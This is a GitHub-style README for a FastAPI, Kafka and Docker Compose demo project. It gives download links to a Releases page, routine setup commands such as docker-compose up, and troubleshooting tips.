---
layout: "default"
title: "🎉 fastapi-kafka-docker-demo - Simple Event Streaming Made Easy"
description: "🚀 Set up Apache Kafka with FastAPI using Docker Compose to demonstrate a simple producer and consumer workflow for learning and experimentation."
---
# 🎉 fastapi-kafka-docker-demo - Simple Event Streaming Made Easy

[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Ashishkabirpanthi/fastapi-kafka-docker-demo/releases)

## 🚀 Getting Started

This guide will help you set up and run the fastapi-kafka-docker-demo application on your computer. This demo showcases how to handle event streaming using Kafka and FastAPI, all wrapped in a Docker setup. Follow these simple steps to get everything working smoothly.

## 💻 System Requirements

Before you start, ensure your system meets these basic requirements:

- A computer running Windows, macOS, or Linux.
- At least 4 GB of RAM.
- Docker and Docker Compose installed. You can download Docker from [Docker's official site](https://www.docker.com/get-started).
- Basic familiarity with command line interface.

## 📥 Download & Install

To download the application, visit the [Releases page](https://github.com/Ashishkabirpanthi/fastapi-kafka-docker-demo/releases). Here, you can find the latest version of the software. 

### Steps to Download:

1. Click on the above link or on the button below to visit the Releases page.
2. Look for the latest version of the application.
3. Download the appropriate files for your system.

[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Ashishkabirpanthi/fastapi-kafka-docker-demo/releases)

## 📂 File Contents

After you download the files, you will find the following components:

- **Dockerfile**: The setup file for creating Docker containers.
- **docker-compose.yml**: This file helps in managing multiple Docker containers easily.
- **FastAPI application**: The main codebase for the event streaming service.
- **README.md**: This file, which provides instructions on how to use the system.

## ⚙️ Running the Application

Once you have downloaded and extracted the files, follow these steps to run the application:

1. **Open a terminal**: Depending on your operating system, you can use Command Prompt (Windows), Terminal (macOS), or your favorite terminal emulator (Linux).
  
2. **Navigate to the project folder**: Use the `cd` command. For example, if you extracted the files to a folder named "fastapi-kafka-docker-demo", enter the following command:

   ```bash
   cd path/to/fastapi-kafka-docker-demo
   ```

3. **Start the application**: Run the following command to start all the services defined in the docker-compose file.

   ```bash
   docker-compose up
   ```

4. **Access the application**: Once the services are running, open your web browser. Navigate to `http://localhost:8000` to access the FastAPI interface.

## 📊 Monitoring and Testing

You can view the logs from the services running in Docker to monitor the application. To do this:

1. Open a new terminal.
2. Navigate back to the project folder.
3. Run:

   ```bash
   docker-compose logs
   ```

This will help you understand what is happening under the hood and ensure everything is running smoothly.

## 🛠️ Troubleshooting

If you encounter issues, consider these common solutions:

- Ensure Docker is installed and running.
- Check if your system meets the minimum requirements.
- Make sure you are in the correct directory when running commands.
- Review the logs for error messages.

## 📖 About the Technologies Used

- **Kafka**: A powerful distributed event streaming platform that helps handle data in real-time.
- **FastAPI**: A modern framework for building APIs with Python that is fast and easy to use.
- **Docker**: A tool designed to make it easier to create, deploy, and run applications by using containers.

## 🛡️ License

This project is licensed under the MIT License. See the LICENSE file for more details.

## 🤝 Contributing

If you want to contribute to this project, you are welcome! Please fork the repository and create a pull request with your changes.

## 🌐 More Information

For further information, check the documentation provided in the codebase or visit the relevant resources on Kafka and FastAPI:

- [Kafka Documentation](https://kafka.apache.org/documentation/)
- [FastAPI Documentation](https://fastapi.tiangolo.com/)

By following these steps, you will successfully download and run the fastapi-kafka-docker-demo application. Enjoy exploring event streaming!